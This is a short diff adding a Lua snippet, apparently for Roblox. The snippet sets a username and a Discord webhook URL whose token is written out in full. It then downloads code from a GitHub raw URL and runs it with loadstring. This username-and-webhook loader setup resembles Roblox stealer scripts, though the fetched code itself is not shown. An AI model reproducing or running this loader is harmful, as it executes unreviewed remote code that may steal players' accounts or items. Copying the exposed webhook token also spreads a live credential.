@@ -1,0 +1,4 @@
+Username = "myusername" 
+Webhook = "`https://discord.com/api/v10/webhooks/1208212630313893939/nMutUStMx9840PV2wBNuFOAZgvI1l738fK5-PLjV8dfA2n5vHz-bxPe6Hw8h4URiFFIS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0rbitScripts/0rbit/main/source"))()
